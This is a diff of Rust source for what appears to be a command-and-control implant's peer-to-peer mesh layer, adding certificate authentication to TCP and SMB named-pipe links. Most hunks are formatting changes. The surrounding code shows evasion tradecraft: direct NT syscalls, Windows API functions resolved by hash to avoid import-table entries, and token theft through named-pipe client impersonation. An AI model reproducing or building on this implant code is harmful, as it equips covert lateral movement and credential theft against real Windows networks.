+                                                    nt_pipe_server::NtPipeHandle::write_frame(
+                                                        pipe, &enc_frame,
+                                                    )
+                                                },
+                                            )
                                         }
                                         _ => Err(anyhow::anyhow!("unsupported transport")),
                                     };
@@ -3633,16 +3908,16 @@ pub fn spawn_parent_reader(
                                 Err(e) => {
                                     log::warn!(
                                         "parent reader: KeyRotation error on {:#010X}: {}",
-                                        parent_link_id, e
+                                        parent_link_id,
+                                        e
                                     );
                                 }
                             }
                         }
                         P2pFrameType::KeyRotationAck => {
-                            match mesh_guard.handle_key_rotation_ack(
-                                parent_link_id,
-                                &decrypted_frame.payload,
-                            ) {
+                            match mesh_guard
+                                .handle_key_rotation_ack(parent_link_id, &decrypted_frame.payload)
+                            {
                                 Ok(()) => {
                                     log::info!(
                                         "parent reader: key rotation completed on {:#010X}",
@@ -3652,21 +3927,18 @@ pub fn spawn_parent_reader(
                                 Err(e) => {
                                     log::warn!(
                                         "parent reader: KeyRotationAck error on {:#010X}: {}",
-                                        parent_link_id, e
+                                        parent_link_id,
+                                        e
                                     );
                                 }
                             }
                         }
                         P2pFrameType::CertificateRevocation => {
                             use common::p2p_proto::CertificateRevocationData;
-                            match CertificateRevocationData::from_bytes(
-                                &decrypted_frame.payload,
-                            ) {
+                            match CertificateRevocationData::from_bytes(&decrypted_frame.payload) {
                                 Ok(data) => {
-                                    let terminated =
-                                        mesh_guard.handle_certificate_revocation(
-                                            data.revoked_agent_id_hash,
-                                        );
+                                    let terminated = mesh_guard
+                                        .handle_certificate_revocation(data.revoked_agent_id_hash);
                                     if !terminated.is_empty() {
                                         log::info!(
                                             "parent reader: cert revocation terminated {} links",
@@ -3690,9 +3962,7 @@ pub fn spawn_parent_reader(
                         }
                         P2pFrameType::QuarantineReport => {
                             use common::p2p_proto::QuarantineReportData;
-                            match QuarantineReportData::from_bytes(
-                                &decrypted_frame.payload,
-                            ) {
+                            match QuarantineReportData::from_bytes(&decrypted_frame.payload) {
                                 Ok(data) => {
                                     log::info!(
                                         "parent reader: quarantine report from parent {:#010X}",
@@ -3721,10 +3991,13 @@ pub fn spawn_parent_reader(
                                 &decrypted_frame.payload,
                                 mesh.clone(),
                                 dummy_tx.clone(),
-                            ).await {
+                            )
+                            .await
+                            {
                                 log::debug!(
                                     "PeerDiscovery error on parent {:#010X}: {}",
-                                    parent_link_id, e
+                                    parent_link_id,
+                                    e
                                 );
                             }
                         }
@@ -3733,7 +4006,8 @@ pub fn spawn_parent_reader(
                                 &mut mesh_guard,
                                 &decrypted_frame,
                                 &dummy_tx,
-                            ).await;
+                            )
+                            .await;
                         }
                     }
                 }
@@ -3832,9 +4106,7 @@ async fn send_heartbeat(link: &mut P2pLink) -> anyhow::Result<()> {
         }
 
         _ => {
-            return Err(anyhow::anyhow!(
-                "unsupported transport for P2P heartbeat"
-            ));
+            return Err(anyhow::anyhow!("unsupported transport for P2P heartbeat"));
         }
     }
 
@@ -3865,9 +4137,7 @@ async fn send_disconnect(link: &mut P2pLink) -> anyhow::Result<()> {
         }
 
         _ => {
-            return Err(anyhow::anyhow!(
-                "unsupported transport for P2P disconnect"
-            ));
+            return Err(anyhow::anyhow!("unsupported transport for P2P disconnect"));
         }
     }
 
@@ -3916,15 +4186,14 @@ pub fn spawn_heartbeat_task(
 ) -> tokio::task::JoinHandle<()> {
     tokio::spawn(async move {
         let dead_timeout = heartbeat_interval * 3;
-        let mut topo_tick = tokio::time::interval(
-            std::time::Duration::from_secs(TOPOLOGY_REPORT_INTERVAL_SECS),
-        );
-        let mut route_tick = tokio::time::interval(
-            std::time::Duration::from_secs(ROUTE_UPDATE_INTERVAL_SECS),
-        );
-        let mut bw_probe_tick = tokio::time::interval(
-            std::time::Duration::from_secs(BANDWIDTH_PROBE_INTERVAL_SECS),
-        );
+        let mut topo_tick = tokio::time::interval(std::time::Duration::from_secs(
+            TOPOLOGY_REPORT_INTERVAL_SECS,
+        ));
+        let mut route_tick =
+            tokio::time::interval(std::time::Duration::from_secs(ROUTE_UPDATE_INTERVAL_SECS));
+        let mut bw_probe_tick = tokio::time::interval(std::time::Duration::from_secs(
+            BANDWIDTH_PROBE_INTERVAL_SECS,
+        ));
         // Stagger the first topology report so it doesn't collide with
         // the first heartbeat.
         topo_tick.tick().await;
@@ -4299,8 +4568,14 @@ pub fn handle_heartbeat(link: &mut P2pLink, decrypted_payload: &[u8]) -> anyhow:
         ));
     }
     let peer_ts = u64::from_le_bytes([
-        decrypted_payload[0], decrypted_payload[1], decrypted_payload[2], decrypted_payload[3],
-        decrypted_payload[4], decrypted_payload[5], decrypted_payload[6], decrypted_payload[7],
+        decrypted_payload[0],
+        decrypted_payload[1],
+        decrypted_payload[2],
+        decrypted_payload[3],
+        decrypted_payload[4],
+        decrypted_payload[5],
+        decrypted_payload[6],
+        decrypted_payload[7],
     ]);
 
     // Calculate RTT from peer's timestamp vs our clock.
@@ -4388,13 +4663,12 @@ pub mod tcp_transport {
 
             // 3. Parse the P2pFrame.
             let header = &frame_buf[..HEADER_SIZE];
-            let frame_type = P2pFrameType::from_u8(header[0]).ok_or_else(|| {
-                anyhow!("unknown P2P frame type: 0x{:02X}", header[0])
-            })?;
+            let frame_type = P2pFrameType::from_u8(header[0])
+                .ok_or_else(|| anyhow!("unknown P2P frame type: 0x{:02X}", header[0]))?;
             let link_id = u32::from_le_bytes([header[2], header[3], header[4], header[5]]);
             let sequence = u64::from_le_bytes([
-                header[6], header[7], header[8], header[9],
-                header[10], header[11], header[12], header[13],
+                header[6], header[7], header[8], header[9], header[10], header[11], header[12],
+                header[13],
             ]);
             let payload_len = u32::from_le_bytes([header[14], header[15], header[16], header[17]]);
 
@@ -4439,10 +4713,7 @@ pub mod tcp_transport {
         }
 
         /// Read a P2pFrame and decrypt its payload using the given key.
-        pub async fn read_frame_decrypt(
-            &mut self,
-            key: &[u8; 32],
-        ) -> Result<P2pFrame> {
+        pub async fn read_frame_decrypt(&mut self, key: &[u8; 32]) -> Result<P2pFrame> {
             let mut frame = self.read_frame().await?;
             if !frame.payload.is_empty() {
                 frame.payload = decrypt_payload(key, &frame.payload)?;
@@ -4492,8 +4763,8 @@ pub mod tcp_transport {
         bind_addr: std::net::SocketAddr,
         /// Maximum number of child links (capacity check).
         max_children: usize,
-        /// This agent's ID.
-        agent_id: String,
+        /// Authenticated mesh identity for this listener.
+        auth: MeshAuthContext,
     }
 
     impl std::fmt::Debug for P2pTcpListener {
@@ -4510,11 +4781,7 @@ pub mod tcp_transport {
         ///
         /// If `port` is 0, the OS assigns a random available port.
         /// Use [`bind_addr()`](Self::bind_addr) to discover the actual port.
-        pub async fn create(
-            agent_id: String,
-            max_children: usize,
-            port: u16,
-        ) -> Result<Self> {
+        pub async fn create(auth: MeshAuthContext, max_children: usize, port: u16) -> Result<Self> {
             let bind_addr: std::net::SocketAddr = format!("127.0.0.1:{port}")
                 .parse()
                 .map_err(|e| anyhow!("invalid bind address: {e}"))?;
@@ -4532,7 +4799,7 @@ pub mod tcp_transport {
                 listener,
                 bind_addr: actual_addr,
                 max_children,
-                agent_id,
+                auth,
             })
         }
 
@@ -4550,9 +4817,7 @@ pub mod tcp_transport {
             let (stream, peer_addr) = match self.listener.accept().await {
                 Ok(s) => s,
                 Err(e) => {
-                    return P2pListenerEvent::ListenerError(format!(
-                        "TCP accept failed: {e}"
-                    ));
+                    return P2pListenerEvent::ListenerError(format!("TCP accept failed: {e}"));
                 }
             };
 
@@ -4574,19 +4839,16 @@ pub mod tcp_transport {
             if frame.frame_type != P2pFrameType::LinkRequest {
                 return P2pListenerEvent::LinkRejected {
                     reason: 0xFF,
-                    description: format!(
-                        "expected LinkRequest, got {:?}",
-                        frame.frame_type
-                    ),
+                    description: format!("expected LinkRequest, got {:?}", frame.frame_type),
                 };
             }
 
             // 3. Parse the LinkRequest payload.
-            let (child_agent_id, child_pubkey) = match parse_link_request(&frame.payload) {
+            let child = match parse_link_request(&frame.payload, &self.auth, frame.link_id) {
                 Ok(v) => v,
                 Err(e) => {
                     return P2pListenerEvent::LinkRejected {
-                        reason: 0xFF,
+                        reason: REJECT_AUTHENTICATION_FAILED,
                         description: format!("invalid LinkRequest payload: {e}"),
                     };
                 }
@@ -4594,20 +4856,29 @@ pub mod tcp_transport {
 
             info!(
                 "p2p-tcp: received LinkRequest from agent '{}', link_id={:#010X}",
-                child_agent_id, frame.link_id
+                child.agent_id, frame.link_id
             );
 
             // 4. X25519 ECDH key exchange.
             let our_secret = EphemeralSecret::random_from_rng(rand::thread_rng());
             let our_public = PublicKey::from(&our_secret);
-            let peer_public = PublicKey::from(child_pubkey);
+            let peer_public = PublicKey::from(child.x25519_pubkey);
             let shared = our_secret.diffie_hellman(&peer_public);
 
             // 5. Derive per-link ChaCha20-Poly1305 key via HKDF-SHA256.
             let link_key = derive_link_key(shared.as_bytes());
 
             // 6. Send LinkAccept with our public key.
-            let accept_payload = build_link_accept_payload(our_public.as_bytes());
+            let accept_payload =
+                match build_link_accept_payload(&self.auth, our_public.as_bytes(), frame.link_id) {
+                    Ok(payload) => payload,
+                    Err(e) => {
+                        return P2pListenerEvent::LinkRejected {
+                            reason: REJECT_AUTHENTICATION_FAILED,
+                            description: format!("failed to build LinkAccept: {e}"),
+                        };
+                    }
+                };
             let accept_frame = P2pFrame {
                 frame_type: P2pFrameType::LinkAccept,
                 link_id: frame.link_id,
@@ -4625,7 +4896,7 @@ pub mod tcp_transport {
 
             info!(
                 "p2p-tcp: LinkAccept sent to agent '{}', link_id={:#010X}",
-                child_agent_id, frame.link_id
+                child.agent_id, frame.link_id
             );
 
             // 7. Build and return the P2pLink.
@@ -4635,9 +4906,10 @@ pub mod tcp_transport {
                 frame.link_id,
                 LinkRole::Child,
                 P2pTransport::TcpStream(handle_arc),
-                child_agent_id,
+                child.agent_id,
                 link_key,
             );
+            link.peer_certificate = Some(child.certificate);
 
             if let Err(e) = link.transition(LinkState::Connected) {
                 return P2pListenerEvent::LinkRejected {
@@ -4666,10 +4938,7 @@ pub mod tcp_transport {
         ///
         /// If the mesh is at capacity, sends `LinkReject` with reason
         /// `REJECT_CAPACITY_FULL` and closes the TCP stream.
-        pub async fn accept_with_capacity(
-            &self,
-            current_child_count: usize,
-        ) -> P2pListenerEvent {
+        pub async fn accept_with_capacity(&self, current_child_count: usize) -> P2pListenerEvent {
             if current_child_count >= self.max_children {
                 // Accept the connection first, then reject it.
                 let event = self.accept_one().await;
@@ -4690,9 +4959,7 @@ pub mod tcp_transport {
                     }
                     warn!(
                         "p2p-tcp: rejected link from '{}' — capacity full ({}/{})",
-                        link.peer_agent_id,
-                        current_child_count,
-                        self.max_children
+                        link.peer_agent_id, current_child_count, self.max_children
                     );
                     return P2pListenerEvent::LinkRejected {
                         reason: REJECT_CAPACITY_FULL,
@@ -4786,7 +5053,7 @@ pub mod tcp_transport {
     pub async fn connect(
         host: &str,
         port: u16,
-        agent_id: &str,
+        auth: &MeshAuthContext,
         link_id: u32,
     ) -> Result<ConnectResult> {
         let addr = format!("{host}:{port}");
@@ -4803,7 +5070,7 @@ pub mod tcp_transport {
         let our_public = PublicKey::from(&our_secret);
 
         // 2. Build and send LinkRequest.
-        let req_payload = build_link_request_payload(agent_id, our_public.as_bytes());
+        let req_payload = build_link_request_payload(auth, our_public.as_bytes(), link_id)?;
         let req_frame = P2pFrame {
             frame_type: P2pFrameType::LinkRequest,
             link_id,
@@ -4821,18 +5088,11 @@ pub mod tcp_transport {
 
         match resp_frame.frame_type {
             P2pFrameType::LinkAccept => {
-                // 4. Parse parent's X25519 public key.
-                if resp_frame.payload.len() < 32 {
-                    return Err(anyhow!(
-                        "LinkAccept payload too short: {} < 32",
-                        resp_frame.payload.len()
-                    ));
-                }
-                let mut parent_pubkey = [0u8; 32];
-                parent_pubkey.copy_from_slice(&resp_frame.payload[..32]);
+                // 4. Parse and verify parent's authenticated LinkAccept.
+                let parent = parse_link_accept(&resp_frame.payload, auth, link_id)?;
 
                 // 5. Complete ECDH.
-                let peer_public = PublicKey::from(parent_pubkey);
+                let peer_public = PublicKey::from(parent.x25519_pubkey);
                 let shared = our_secret.diffie_hellman(&peer_public);
 
                 // 6. Derive per-link key.
@@ -4850,9 +5110,10 @@ pub mod tcp_transport {
                     link_id,
                     LinkRole::Parent,
                     P2pTransport::TcpStream(handle_arc),
-                    addr, // peer_agent_id is the address for now
+                    parent.agent_id,
                     link_key,
                 );
+                link.peer_certificate = Some(parent.certificate);
 
                 link.transition(LinkState::Connected)
                     .map_err(|e| anyhow!("link state transition failed: {e}"))?;
@@ -4874,13 +5135,13 @@ pub mod tcp_transport {
                 let reason = resp_frame.payload.first().copied().unwrap_or(0xFF);
                 let description = if reason == REJECT_CAPACITY_FULL {
                     "parent at capacity".to_string()
+                } else if reason == REJECT_AUTHENTICATION_FAILED {
+                    "parent rejected mesh certificate or identity proof".to_string()
                 } else {
                     format!("rejected with reason code {reason:#04X}")
                 };
 
-                warn!(
-                    "p2p-tcp: link rejected by parent at {addr}: {description}"
-                );
+                warn!("p2p-tcp: link rejected by parent at {addr}: {description}");
 
                 Ok(ConnectResult::Rejected {
                     reason,
@@ -4888,10 +5149,7 @@ pub mod tcp_transport {
                 })
             }
 
-            other => Err(anyhow!(
-                "unexpected response frame type: {:?}",
-                other
-            )),
+            other => Err(anyhow!("unexpected response frame type: {:?}", other)),
         }
     }
 }
@@ -4916,7 +5174,7 @@ pub mod tcp_transport {
 
     impl P2pTcpListener {
         pub async fn create(
-            _agent_id: String,
+            _auth: super::MeshAuthContext,
             _max_children: usize,
             _port: u16,
         ) -> anyhow::Result<Self> {
@@ -4940,7 +5198,7 @@ pub mod tcp_transport {
     pub async fn connect(
         _host: &str,
         _port: u16,
-        _agent_id: &str,
+        _auth: &super::MeshAuthContext,
         _link_id: u32,
     ) -> anyhow::Result<ConnectResult> {
         Err(anyhow::anyhow!(
@@ -4956,8 +5214,8 @@ pub mod tcp_transport {
 #[cfg(all(windows, feature = "smb-pipe-transport"))]
 pub mod nt_pipe_server {
     use super::*;
-    use anyhow::{anyhow, Result};
     use crate::win_types::IO_STATUS_BLOCK;
+    use anyhow::{anyhow, Result};
     use log::{info, warn};
     use std::sync::Mutex;
     use x25519_dalek::{EphemeralSecret, PublicKey};
@@ -4982,7 +5240,6 @@ pub mod nt_pipe_server {
 
     // Re-export shared constants from parent scope.
     pub use super::REJECT_CAPACITY_FULL;
-    
 
     // ── NT pipe handle wrapper ───────────────────────────────────────────
 
@@ -5049,13 +5306,12 @@ pub mod nt_pipe_server {
             let mut header = [0u8; HEADER_SIZE];
             self.read_exact(&mut header)?;
 
-            let frame_type = P2pFrameType::from_u8(header[0]).ok_or_else(|| {
-                anyhow!("unknown P2P frame type: 0x{:02X}", header[0])
-            })?;
+            let frame_type = P2pFrameType::from_u8(header[0])
+                .ok_or_else(|| anyhow!("unknown P2P frame type: 0x{:02X}", header[0]))?;
             let link_id = u32::from_le_bytes([header[2], header[3], header[4], header[5]]);
             let sequence = u64::from_le_bytes([
-                header[6], header[7], header[8], header[9],
-                header[10], header[11], header[12], header[13],
+                header[6], header[7], header[8], header[9], header[10], header[11], header[12],
+                header[13],
             ]);
             let payload_len = u32::from_le_bytes([header[14], header[15], header[16], header[17]]);
 
@@ -5098,10 +5354,7 @@ pub mod nt_pipe_server {
     // ── NT syscall wrappers ──────────────────────────────────────────────
 
     /// Build a Windows NT UNICODE_STRING on the stack.
-    unsafe fn init_unicode_string(
-        dest: &mut winapi::shared::ntdef::UNICODE_STRING,
-        s: &[u16],
-    ) {
+    unsafe fn init_unicode_string(dest: &mut winapi::shared::ntdef::UNICODE_STRING, s: &[u16]) {
         dest.Buffer = s.as_ptr() as *mut _;
         dest.Length = (s.len() * 2) as u16;
         dest.MaximumLength = dest.Length;
@@ -5120,7 +5373,10 @@ pub mod nt_pipe_server {
         } else {
             format!(r"\??\{}", pipe_path)
         };
-        let nt_wide: Vec<u16> = nt_path_str.encode_utf16().chain(std::iter::once(0)).collect();
+        let nt_wide: Vec<u16> = nt_path_str
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
 
         let mut name_str: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
         init_unicode_string(&mut name_str, &nt_wide);
@@ -5144,12 +5400,12 @@ pub mod nt_pipe_server {
             (GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE) as u64,
             &mut obj_attrs as *mut _ as u64,
             &mut iosb as *mut _ as u64,
-            FILE_PIPE_MESSAGE_MODE as u64,               // ReadMode
-            FILE_PIPE_QUEUE_OPERATION as u64,             // CompletionMode (blocking)
-            max_instances as u64,                          // MaximumInstances
-            65536u64,                                       // InboundQuota
-            65536u64,                                       // OutboundQuota
-            &mut timeout as *mut _ as u64,                // DefaultTimeout
+            FILE_PIPE_MESSAGE_MODE as u64,    // ReadMode
+            FILE_PIPE_QUEUE_OPERATION as u64, // CompletionMode (blocking)
+            max_instances as u64,             // MaximumInstances
+            65536u64,                         // InboundQuota
+            65536u64,                         // OutboundQuota
+            &mut timeout as *mut _ as u64,    // DefaultTimeout
         )
         .map_err(|e| anyhow!("nt_syscall resolution for NtCreateNamedPipeFile: {e}"))?;
 
@@ -5168,16 +5424,16 @@ pub mod nt_pipe_server {
         let mut iosb: IO_STATUS_BLOCK = std::mem::zeroed();
         let status = crate::syscall!(
             "NtFsControlFile",
-            handle as u64,                              // FileHandle
-            0u64,                                        // Event
-            0u64,                                        // ApcRoutine
-            0u64,                                        // ApcContext
-            &mut iosb as *mut _ as u64,                 // IoStatusBlock
-            FSCTL_PIPE_LISTEN as u64,                   // FsControlCode
-            0u64,                                        // InputBuffer
-            0u64,                                        // InputBufferLength
-            0u64,                                        // OutputBuffer
-            0u64,                                        // OutputBufferLength
+            handle as u64,              // FileHandle
+            0u64,                       // Event
+            0u64,                       // ApcRoutine
+            0u64,                       // ApcContext
+            &mut iosb as *mut _ as u64, // IoStatusBlock
+            FSCTL_PIPE_LISTEN as u64,   // FsControlCode
+            0u64,                       // InputBuffer
+            0u64,                       // InputBufferLength
+            0u64,                       // OutputBuffer
+            0u64,                       // OutputBufferLength
         )
         .map_err(|e| anyhow!("nt_syscall resolution for NtFsControlFile: {e}"))?;
 
@@ -5278,9 +5534,7 @@ pub mod nt_pipe_server {
     ///
     /// Returns the raw NTSTATUS on failure so the caller can decide
     /// whether to retry.  On success, returns the pipe handle.
-    unsafe fn open_pipe_raw(
-        pipe_path: &str,
-    ) -> std::result::Result<*mut std::ffi::c_void, i32> {
+    unsafe fn open_pipe_raw(pipe_path: &str) -> std::result::Result<*mut std::ffi::c_void, i32> {
         // Convert to NT path:
         //   Win32  \\.\pipe\name  →  \??\pipe\name
         //   NT     \??\pipe\name  →  unchanged
@@ -5292,7 +5546,10 @@ pub mod nt_pipe_server {
         } else {
             format!(r"\??\pipe\{}", pipe_path)
         };
-        let nt_wide: Vec<u16> = nt_path_str.encode_utf16().chain(std::iter::once(0)).collect();
+        let nt_wide: Vec<u16> = nt_path_str
+            .encode_utf16()
+            .chain(std::iter::once(0))
+            .collect();
 
         let mut name_str: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
         init_unicode_string(&mut name_str, &nt_wide);
@@ -5307,12 +5564,12 @@ pub mod nt_pipe_server {
 
         let status = match crate::syscall!(
             "NtOpenFile",
-            &mut handle as *mut _ as u64,                 // FileHandle
+            &mut handle as *mut _ as u64, // FileHandle
             (GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE) as u64, // DesiredAccess
-            &mut obj_attrs as *mut _ as u64,              // ObjectAttributes
-            &mut iosb as *mut _ as u64,                   // IoStatusBlock
-            (FILE_SHARE_READ | FILE_SHARE_WRITE) as u64,  // ShareAccess
-            FILE_SYNCHRONOUS_IO_NONALERT as u64,          // OpenOptions
+            &mut obj_attrs as *mut _ as u64, // ObjectAttributes
+            &mut iosb as *mut _ as u64,   // IoStatusBlock
+            (FILE_SHARE_READ | FILE_SHARE_WRITE) as u64, // ShareAccess
+            FILE_SYNCHRONOUS_IO_NONALERT as u64, // OpenOptions
         ) {
             Ok(status) => status,
             Err(e) => {
@@ -5339,7 +5596,9 @@ pub mod nt_pipe_server {
         for attempt in 0..MAX_CONNECT_RETRIES {
             match unsafe { open_pipe_raw(pipe_path) } {
                 Ok(h) => return Ok(h),
-                Err(status) if status == STATUS_PIPE_BUSY || status == STATUS_INSTANCE_NOT_AVAILABLE => {
+                Err(status)
+                    if status == STATUS_PIPE_BUSY || status == STATUS_INSTANCE_NOT_AVAILABLE =>
+                {
                     if attempt + 1 < MAX_CONNECT_RETRIES {
                         info!(
                             "p2p-pipe: pipe busy (NTSTATUS {:#010X}), retrying ({}/{}) in {}ms",
@@ -5348,7 +5607,9 @@ pub mod nt_pipe_server {
                             MAX_CONNECT_RETRIES,
                             CONNECT_RETRY_DELAY_MS,
                         );
-                        std::thread::sleep(std::time::Duration::from_millis(CONNECT_RETRY_DELAY_MS));
+                        std::thread::sleep(std::time::Duration::from_millis(
+                            CONNECT_RETRY_DELAY_MS,
+                        ));
                         continue;
                     }
                     return Err(anyhow!(
@@ -5405,11 +5666,7 @@ pub mod nt_pipe_server {
     /// - A bare pipe name: `<name>` (will be prefixed with `\??\pipe\`)
     ///
     /// This is a **blocking** function (NT pipe I/O is synchronous).
-    pub fn connect(
-        pipe_addr: &str,
-        agent_id: &str,
-        link_id: u32,
-    ) -> Result<ConnectResult> {
+    pub fn connect(pipe_addr: &str, auth: &MeshAuthContext, link_id: u32) -> Result<ConnectResult> {
         info!("p2p-pipe: connecting to parent at '{pipe_addr}'");
 
         // Open the pipe with retry logic.
@@ -5425,7 +5682,7 @@ pub mod nt_pipe_server {
         let our_public = PublicKey::from(&our_secret);
 
         // 2. Build and send LinkRequest.
-        let req_payload = build_link_request_payload(agent_id, our_public.as_bytes());
+        let req_payload = build_link_request_payload(auth, our_public.as_bytes(), link_id)?;
         let req_frame = P2pFrame {
             frame_type: P2pFrameType::LinkRequest,
             link_id,
@@ -5442,18 +5699,11 @@ pub mod nt_pipe_server {
 
         match resp_frame.frame_type {
             P2pFrameType::LinkAccept => {
-                // 4. Parse parent's X25519 public key.
-                if resp_frame.payload.len() < 32 {
-                    return Err(anyhow!(
-                        "LinkAccept payload too short: {} < 32",
-                        resp_frame.payload.len()
-                    ));
-                }
-                let mut parent_pubkey = [0u8; 32];
-                parent_pubkey.copy_from_slice(&resp_frame.payload[..32]);
+                // 4. Parse and verify parent's authenticated LinkAccept.
+                let parent = parse_link_accept(&resp_frame.payload, auth, link_id)?;
 
                 // 5. Complete ECDH.
-                let peer_public = PublicKey::from(parent_pubkey);
+                let peer_public = PublicKey::from(parent.x25519_pubkey);
                 let shared = our_secret.diffie_hellman(&peer_public);
 
                 // 6. Derive per-link key.
@@ -5469,9 +5719,10 @@ pub mod nt_pipe_server {
                     link_id,
                     LinkRole::Parent,
                     P2pTransport::SmbPipe(pipe),
-                    pipe_addr.to_string(), // peer addr as identifier
+                    parent.agent_id,
                     link_key,
                 );
+                link.peer_certificate = Some(parent.certificate);
                 link.transition(LinkState::Connected)
                     .map_err(|e| anyhow!("link state transition failed: {e}"))?;
 
@@ -5492,26 +5743,29 @@ pub mod nt_pipe_server {
                 let reason = resp_frame.payload.first().copied().unwrap_or(0xFF);
                 let description = if reason == REJECT_CAPACITY_FULL {
                     "parent at capacity".to_string()
+                } else if reason == REJECT_AUTHENTICATION_FAILED {
+                    "parent rejected mesh certificate or identity proof".to_string()
                 } else {
                     format!("rejected with reason code {reason:#04X}")
                 };
 
-                warn!(
-                    "p2p-pipe: link rejected by parent at '{pipe_addr}': {description}"
-                );
+                warn!("p2p-pipe: link rejected by parent at '{pipe_addr}': {description}");
 
-                Ok(ConnectResult::Rejected { reason, description })
+                Ok(ConnectResult::Rejected {
+                    reason,
+                    description,
+                })
             }
 
-            other => Err(anyhow!(
-                "unexpected response frame type: {:?}",
-                other
-            )),
+            other => Err(anyhow!("unexpected response frame type: {:?}", other)),
         }
     }
 
     // Re-use shared handshake helpers from parent scope.
-    use super::{derive_link_key, parse_link_request, build_link_request_payload, build_link_accept_payload, build_link_reject_payload};
+    use super::{
+        build_link_accept_payload, build_link_reject_payload, build_link_request_payload,
+        derive_link_key, parse_link_accept, parse_link_request,
+    };
 
     // ── P2P pipe listener ────────────────────────────────────────────────
 
@@ -5525,8 +5779,8 @@ pub mod nt_pipe_server {
         server_handle: std::sync::Arc<Mutex<*mut std::ffi::c_void>>,
         /// Maximum number of child links (capacity check).
         max_children: usize,
-        /// This agent's ID.
-        agent_id: String,
+        /// Authenticated mesh identity for this listener.
+        auth: MeshAuthContext,
     }
 
     // SAFETY: server_handle is protected by Mutex.
@@ -5539,13 +5793,9 @@ pub mod nt_pipe_server {
         /// Creates the named pipe at
         /// `\\.\pipe\<IOC_PIPE_NAME>-p2p-<suffix>` where `<suffix>` is a
         /// random 4-hex-char string.
-        pub fn create(agent_id: String, max_children: usize) -> Result<Self> {
+        pub fn create(auth: MeshAuthContext, max_children: usize) -> Result<Self> {
             let suffix = Self::random_suffix();
-            let pipe_name = format!(
-                "{}-p2p-{}",
-                common::ioc::IOC_PIPE_NAME,
-                suffix
-            );
+            let pipe_name = format!("{}-p2p-{}", common::ioc::IOC_PIPE_NAME, suffix);
             let pipe_path = format!(r"\\.\pipe\{}", pipe_name);
 
             let max_instances = (max_children + 2) as u32; // headroom
@@ -5563,7 +5813,7 @@ pub mod nt_pipe_server {
                 pipe_path,
                 server_handle: std::sync::Arc::new(Mutex::new(server_handle)),
                 max_children,
-                agent_id,
+                auth,
             })
         }
 
@@ -5627,10 +5877,15 @@ pub mod nt_pipe_server {
             {
                 if crate::token_impersonation::is_enabled() {
                     // Resolve advapi32 functions at runtime to avoid IAT entries.
-                    let advapi32_w: &[u16] = &['a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
-                    let advapi32 = match unsafe { pe_resolve::get_module_handle_by_hash(
-                        pe_resolve::hash_wstr(&advapi32_w[..advapi32_w.len() - 1]),
-                    ) } {
+                    let advapi32_w: &[u16] = &[
+                        'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16,
+                        '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+                    ];
+                    let advapi32 = match unsafe {
+                        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_wstr(
+                            &advapi32_w[..advapi32_w.len() - 1],
+                        ))
+                    } {
                         Some(base) => base,
                         None => {
                             log::debug!("p2p-pipe: advapi32 not found for token extraction");
@@ -5640,15 +5895,36 @@ pub mod nt_pipe_server {
                             };
                         }
                     };
-                    let impersonate_fn: Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> i32> =
-                        unsafe { pe_resolve::get_proc_address_by_hash(advapi32, pe_resolve::hash_str(b"ImpersonateNamedPipeClient\0")) }
-                            .map(|addr| unsafe { std::mem::transmute(addr) });
-                    let open_thread_token_fn: Option<unsafe extern "system" fn(*mut std::ffi::c_void, u32, i32, *mut *mut std::ffi::c_void) -> i32> =
-                        unsafe { pe_resolve::get_proc_address_by_hash(advapi32, pe_resolve::hash_str(b"OpenThreadToken\0")) }
-                            .map(|addr| unsafe { std::mem::transmute(addr) });
-                    let revert_fn: Option<unsafe extern "system" fn() -> i32> =
-                        unsafe { pe_resolve::get_proc_address_by_hash(advapi32, pe_resolve::hash_str(b"RevertToSelf\0")) }
-                            .map(|addr| unsafe { std::mem::transmute(addr) });
+                    let impersonate_fn: Option<
+                        unsafe extern "system" fn(*mut std::ffi::c_void) -> i32,
+                    > = unsafe {
+                        pe_resolve::get_proc_address_by_hash(
+                            advapi32,
+                            pe_resolve::hash_str(b"ImpersonateNamedPipeClient\0"),
+                        )
+                    }
+                    .map(|addr| unsafe { std::mem::transmute(addr) });
+                    let open_thread_token_fn: Option<
+                        unsafe extern "system" fn(
+                            *mut std::ffi::c_void,
+                            u32,
+                            i32,
+                            *mut *mut std::ffi::c_void,
+                        ) -> i32,
+                    > = unsafe {
+                        pe_resolve::get_proc_address_by_hash(
+                            advapi32,
+                            pe_resolve::hash_str(b"OpenThreadToken\0"),
+                        )
+                    }
+                    .map(|addr| unsafe { std::mem::transmute(addr) });
+                    let revert_fn: Option<unsafe extern "system" fn() -> i32> = unsafe {
+                        pe_resolve::get_proc_address_by_hash(
+                            advapi32,
+                            pe_resolve::hash_str(b"RevertToSelf\0"),
+                        )
+                    }
+                    .map(|addr| unsafe { std::mem::transmute(addr) });
 
                     if let (Some(impersonate), Some(open_tok), Some(revert)) =
                         (impersonate_fn, open_thread_token_fn, revert_fn)
@@ -5713,19 +5989,16 @@ pub mod nt_pipe_server {
             if frame.frame_type != P2pFrameType::LinkRequest {
                 return P2pListenerEvent::LinkRejected {
                     reason: 0xFF,
-                    description: format!(
-                        "expected LinkRequest, got {:?}",
-                        frame.frame_type
-                    ),
+                    description: format!("expected LinkRequest, got {:?}", frame.frame_type),
                 };
             }
 
             // 4. Parse the LinkRequest payload.
-            let (child_agent_id, child_pubkey) = match parse_link_request(&frame.payload) {
+            let child = match parse_link_request(&frame.payload, &self.auth, frame.link_id) {
                 Ok(v) => v,
                 Err(e) => {
                     return P2pListenerEvent::LinkRejected {
-                        reason: 0xFF,
+                        reason: REJECT_AUTHENTICATION_FAILED,
                         description: format!("invalid LinkRequest payload: {e}"),
                     };
                 }
@@ -5733,20 +6006,29 @@ pub mod nt_pipe_server {
 
             info!(
                 "p2p-pipe: received LinkRequest from agent '{}', link_id={:#010X}",
-                child_agent_id, frame.link_id
+                child.agent_id, frame.link_id
             );
 
